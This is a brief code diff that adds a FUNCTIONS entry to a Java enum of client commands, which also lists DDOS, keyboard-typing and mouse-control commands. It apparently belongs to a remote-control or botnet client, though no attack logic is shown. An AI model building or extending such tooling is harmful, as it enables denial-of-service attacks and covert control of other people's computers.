@@ -31,6 +31,7 @@ public enum ClientCommandEnum {
 
     // Control
     DDOS(ClientCommandDDOS.class),
+    FUNCTIONS(ClientCommandFunctions.class),
     KEYBOARD_TYPE(ClientCommandKeyboardType.class),
     MOUSE_CLICK(ClientCommandMouseClick.class),
     MOUSE_SCROLL(ClientCommandMouseScroll.class),
